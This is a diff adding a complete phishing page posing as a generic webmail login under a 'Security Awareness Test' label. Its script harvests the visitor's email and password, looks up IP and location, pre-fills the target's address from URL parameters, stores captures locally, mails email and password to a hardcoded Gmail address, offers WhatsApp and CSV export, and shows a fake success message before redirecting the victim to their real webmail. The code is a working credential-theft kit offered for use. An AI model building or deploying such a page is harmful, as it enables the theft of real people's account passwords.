@@ -1,0 +1,558 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Webmail Login - Security Test</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body { 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            padding: 20px;
+        }
+        .container { 
+            background: white; 
+            border-radius: 12px; 
+            box-shadow: 0 15px 35px rgba(0,0,0,0.1); 
+            padding: 40px; 
+            width: 100%; 
+            max-width: 420px; 
+            position: relative;
+            overflow: hidden;
+        }
+        .container::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 5px;
+            background: linear-gradient(90deg, #667eea, #764ba2);
+        }
+        .logo {
+            text-align: center;
+            margin-bottom: 30px;
+            padding: 20px 0;
+        }
+        .logo h1 {
+            color: #333;
+            font-size: 28px;
+            font-weight: 300;
+            margin-bottom: 10px;
+        }
+        .logo p {
+            color: #666;
+            font-size: 14px;
+        }
+        .form-group {
+            margin-bottom: 25px;
+            position: relative;
+        }
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #555;
+            font-weight: 500;
+            font-size: 14px;
+        }
+        input[type="email"], input[type="password"] {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid #e1e5e9;
+            border-radius: 8px;
+            font-size: 16px;
+            transition: all 0.3s ease;
+            background: #f8f9fa;
+        }
+        input:focus {
+            outline: none;
+            border-color: #667eea;
+            background: white;
+            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
+        }
+        .btn {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px rgba(102, 126, 234, 0.3);
+        }
+        .btn:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+        .message {
+            margin: 20px 0;
+            padding: 15px;
+            border-radius: 8px;
+            font-size: 14px;
+            display: none;
+        }
+        .success { 
+            background: #d4edda; 
+            color: #155724; 
+            border: 1px solid #c3e6cb; 
+        }
+        .error { 
+            background: #f8d7da; 
+            color: #721c24; 
+            border: 1px solid #f5c6cb; 
+        }
+        .info { 
+            background: #d1ecf1; 
+            color: #0c5460; 
+            border: 1px solid #bee5eb; 
+        }
+        .status {
+            margin-top: 20px;
+            padding: 15px;
+            background: #f8f9fa;
+            border-radius: 8px;
+            font-size: 12px;
+            line-height: 1.4;
+            display: none;
+        }
+        .methods {
+            margin-top: 20px;
+            padding: 15px;
+            background: #e9ecef;
+            border-radius: 8px;
+            font-size: 12px;
+        }
+        .methods h4 {
+            margin-bottom: 10px;
+            color: #495057;
+        }
+        .methods ul {
+            margin-left: 20px;
+        }
+        .methods li {
+            margin-bottom: 5px;
+            color: #666;
+        }
+        .spinner {
+            display: none;
+            width: 20px;
+            height: 20px;
+            border: 2px solid #ffffff;
+            border-top: 2px solid transparent;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-right: 10px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .reset-link {
+            text-align: center;
+            margin-top: 20px;
+        }
+        .reset-link a {
+            color: #667eea;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        .reset-link a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <h1>🔐 Webmail Login</h1>
+            <p>Security Awareness Test Platform</p>
+        </div>
+        
+        <form id="loginForm">
+            <div class="form-group">
+                <label for="email">Email Address</label>
+                <input type="email" id="email" name="email" required placeholder="Enter your email address" autocomplete="email">
+            </div>
+            
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" required placeholder="Enter your password" autocomplete="current-password">
+            </div>
+            
+            <button type="submit" class="btn" id="loginBtn">
+                <span class="spinner" id="spinner"></span>
+                <span id="btnText">Log In</span>
+            </button>
+        </form>
+        
+        <div class="reset-link">
+            <a href="#" id="resetPassword">Forgot your password?</a>
+        </div>
+        
+        <div id="message" class="message"></div>
+        <div id="status" class="status"></div>
+        
+        <div class="methods">
+            <h4>📊 Capture Methods Available:</h4>
+            <ul>
+                <li>✅ Local browser storage</li>
+                <li>✅ Email client integration</li>
+                <li>✅ Browser console logging</li>
+                <li>✅ CSV download export</li>
+                <li>✅ WhatsApp/Telegram integration</li>
+            </ul>
+        </div>
+    </div>
+
+    <script>
+        // Configuration
+        const CONFIG = {
+            notificationEmail: 'skkho87.sm@gmail.com',
+            telegramBotToken: 'YOUR_BOT_TOKEN', // Optional
+            telegramChatId: 'YOUR_CHAT_ID',     // Optional
+            whatsappNumber: '+1234567890'       // Optional
+        };
+
+        // Storage for captured data
+        let capturedAttempts = JSON.parse(localStorage.getItem('capturedLogins') || '[]');
+
+        // DOM elements
+        const form = document.getElementById('loginForm');
+        const emailInput = document.getElementById('email');
+        const passwordInput = document.getElementById('password');
+        const loginBtn = document.getElementById('loginBtn');
+        const spinner = document.getElementById('spinner');
+        const btnText = document.getElementById('btnText');
+        const messageDiv = document.getElementById('message');
+        const statusDiv = document.getElementById('status');
+
+        // Utility functions
+        function showMessage(text, type = 'info') {
+            messageDiv.innerHTML = text;
+            messageDiv.className = 'message ' + type;
+            messageDiv.style.display = 'block';
+        }
+
+        function showStatus(text) {
+            statusDiv.innerHTML = text;
+            statusDiv.style.display = 'block';
+        }
+
+        function setLoading(loading) {
+            if (loading) {
+                loginBtn.disabled = true;
+                spinner.style.display = 'inline-block';
+                btnText.textContent = 'Processing...';
+                showMessage('🔄 Processing login attempt...', 'info');
+            } else {
+                loginBtn.disabled = false;
+                spinner.style.display = 'none';
+                btnText.textContent = 'Log In';
+            }
+        }
+
+        // Get client information
+        async function getClientInfo() {
+            let ip = 'unknown';
+            let location = { country: 'Unknown', city: 'Unknown' };
+
+            try {
+                // Try to get IP
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                ip = ipData.ip;
+
+                // Try to get location
+                const locResponse = await fetch(`https://ipapi.co/${ip}/json/`);
+                const locData = await locResponse.json();
+                location = {
+                    country: locData.country_name || 'Unknown',
+                    city: locData.city || 'Unknown'
+                };
+            } catch (error) {
+                console.log('Could not fetch IP/location:', error);
+            }
+
+            return {
+                ip,
+                location,
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timestamp: new Date().toISOString(),
+                url: window.location.href
+            };
+        }
+
+        // Validate email domain SMTP
+        async function testEmailDomain(email) {
+            const domain = email.split('@')[1];
+            showStatus(`🔍 Testing SMTP connectivity for ${domain}...`);
+            
+            try {
+                // Try to resolve MX record (simplified check)
+                const response = await fetch(`https://dns.google/resolve?name=${domain}&type=MX`);
+                const data = await response.json();
+                
+                if (data.Answer && data.Answer.length > 0) {
+                    showStatus(`✅ ${domain} has mail servers configured`);
+                    return true;
+                } else {
+                    showStatus(`❌ ${domain} does not appear to have mail servers`);
+                    return false;
+                }
+            } catch (error) {
+                showStatus(`⚠️ Could not verify ${domain} mail servers`);
+                return false; // Assume invalid for demo
+            }
+        }
+
+        // Save attempt data
+        function saveAttempt(attemptData) {
+            capturedAttempts.push(attemptData);
+            localStorage.setItem('capturedLogins', JSON.stringify(capturedAttempts));
+            
+            // Log to console for admin review
+            console.group('🔐 Security Test - Login Attempt Captured');
+            console.table(attemptData);
+            console.groupEnd();
+        }
+
+        // Send via email client
+        function sendViaEmail(attemptData) {
+            const subject = encodeURIComponent(`Security Test Alert - ${attemptData.location.country} - ${attemptData.email}`);
+            const body = encodeURIComponent(`
+Security Awareness Test - Login Attempt Captured
+
+Email: ${attemptData.email}
+Password: ${attemptData.password}
+Domain: ${attemptData.domain}
+
+Location: ${attemptData.location.city}, ${attemptData.location.country}
+IP Address: ${attemptData.ip}
+User Agent: ${attemptData.userAgent}
+Platform: ${attemptData.platform}
+Language: ${attemptData.language}
+Timezone: ${attemptData.timezone}
+Timestamp: ${attemptData.timestamp}
+URL: ${attemptData.url}
+
+SMTP Test: ${attemptData.smtpValid ? 'PASSED' : 'FAILED'}
+Method: Standalone HTML Form
+
+---
+This is an automated security awareness test notification.
+            `);
+
+            const mailtoUrl = `mailto:${CONFIG.notificationEmail}?subject=${subject}&body=${body}`;
+            window.open(mailtoUrl, '_blank');
+            
+            showStatus(`📧 Email client opened with captured data`);
+        }
+
+        // Send via WhatsApp
+        function sendViaWhatsApp(attemptData) {
+            const message = encodeURIComponent(`
+🔐 Security Test Alert
+Email: ${attemptData.email}
+Location: ${attemptData.location.city}, ${attemptData.location.country}
+Time: ${new Date(attemptData.timestamp).toLocaleString()}
+SMTP: ${attemptData.smtpValid ? '✅' : '❌'}
+            `);
+            
+            const whatsappUrl = `https://wa.me/${CONFIG.whatsappNumber.replace('+', '')}?text=${message}`;
+            window.open(whatsappUrl, '_blank');
+        }
+
+        // Export to CSV
+        function exportToCSV() {
+            if (capturedAttempts.length === 0) {
+                showMessage('❌ No data to export', 'error');
+                return;
+            }
+
+            const csvHeaders = ['Timestamp', 'Email', 'Password', 'Domain', 'IP', 'Country', 'City', 'User Agent', 'SMTP Valid'];
+            const csvRows = capturedAttempts.map(attempt => [
+                attempt.timestamp,
+                attempt.email,
+                attempt.password,
+                attempt.domain,
+                attempt.ip,
+                attempt.location.country,
+                attempt.location.city,
+                attempt.userAgent,
+                attempt.smtpValid
+            ]);
+
+            const csvContent = [csvHeaders, ...csvRows]
+                .map(row => row.map(field => `"${field}"`).join(','))
+                .join('\n');
+
+            const blob = new Blob([csvContent], { type: 'text/csv' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `security-test-${new Date().toISOString().split('T')[0]}.csv`;
+            a.click();
+            URL.revokeObjectURL(url);
+
+            showMessage('✅ Data exported to CSV file', 'success');
+        }
+
+        // Auto-populate email from URL
+        function populateEmailFromURL() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const hash = window.location.hash.substring(1);
+            
+            const email = urlParams.get('email') || urlParams.get('user') || 
+                          (hash && hash.includes('@') ? decodeURIComponent(hash) : null);
+            
+            if (email && /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
+                emailInput.value = email;
+                passwordInput.focus();
+                showMessage(`📧 Email auto-populated from URL: ${email}`, 'info');
+            }
+        }
+
+        // Reset password handler
+        document.getElementById('resetPassword').addEventListener('click', function(e) {
+            e.preventDefault();
+            const email = emailInput.value.trim();
+            
+            if (!email) {
+                showMessage('❌ Please enter your email address first', 'error');
+                emailInput.focus();
+                return;
+            }
+            
+            const domain = email.split('@')[1];
+            const webmailUrl = `https://webmail.${domain}`;
+            
+            showMessage(`🔗 Redirecting to ${webmailUrl} for password reset...`, 'info');
+            setTimeout(() => {
+                window.open(webmailUrl, '_blank');
+            }, 1500);
+        });
+
+        // Main form submission handler
+        form.addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const email = emailInput.value.trim();
+            const password = passwordInput.value;
+            
+            // Validation
+            if (!email || !password) {
+                showMessage('❌ Please fill in all fields', 'error');
+                return;
+            }
+            
+            if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
+                showMessage('❌ Please enter a valid email address', 'error');
+                emailInput.focus();
+                return;
+            }
+            
+            setLoading(true);
+            
+            try {
+                // Get client information
+                const clientInfo = await getClientInfo();
+                
+                // Test email domain
+                const smtpValid = await testEmailDomain(email);
+                
+                // Prepare attempt data
+                const attemptData = {
+                    email,
+                    password,
+                    domain: email.split('@')[1],
+                    smtpValid,
+                    ...clientInfo
+                };
+                
+                // Save the attempt
+                saveAttempt(attemptData);
+                
+                // Show success message
+                if (smtpValid) {
+                    showMessage('✅ Login successful! Redirecting to your mailbox...', 'success');
+                    showStatus(`✅ Credentials captured and validated. Total attempts: ${capturedAttempts.length}`);
+                } else {
+                    showMessage('❌ Invalid email or password. Please try again.', 'error');
+                    showStatus(`⚠️ Invalid credentials captured. Total attempts: ${capturedAttempts.length}`);
+                }
+                
+                // Send notifications
+                setTimeout(() => {
+                    sendViaEmail(attemptData);
+                }, 1000);
+                
+                // Redirect after delay
+                setTimeout(() => {
+                    if (smtpValid) {
+                        window.location.href = `https://webmail.${attemptData.domain}`;
+                    } else {
+                        passwordInput.value = '';
+                        passwordInput.focus();
+                    }
+                }, 3000);
+                
+            } catch (error) {
+                showMessage('❌ An error occurred while processing your request', 'error');
+                showStatus(`Error: ${error.message}`);
+                console.error('Form submission error:', error);
+            }
+            
+            setLoading(false);
+        });
+
+        // Initialize
+        document.addEventListener('DOMContentLoaded', function() {
+            populateEmailFromURL();
+            
+            // Show current capture count
+            if (capturedAttempts.length > 0) {
+                showStatus(`📊 ${capturedAttempts.length} attempt(s) previously captured. Press F12 → Console to view data.`);
+            }
+            
+            // Add keyboard shortcuts
+            document.addEventListener('keydown', function(e) {
+                if (e.ctrlKey && e.key === 'e') {
+                    e.preventDefault();
+                    exportToCSV();
+                }
+                if (e.ctrlKey && e.key === 'c') {
+                    e.preventDefault();
+                    console.table(capturedAttempts);
+                }
+            });
+        });
+
+        // Expose functions for manual use
+        window.exportData = exportToCSV;
+        window.viewData = () => console.table(capturedAttempts);
+        window.clearData = () => {
+            localStorage.removeItem('capturedLogins');
+            capturedAttempts = [];
+            showMessage('✅ All captured data cleared', 'success');
+        };
+    </script>
+</body>
+</html>
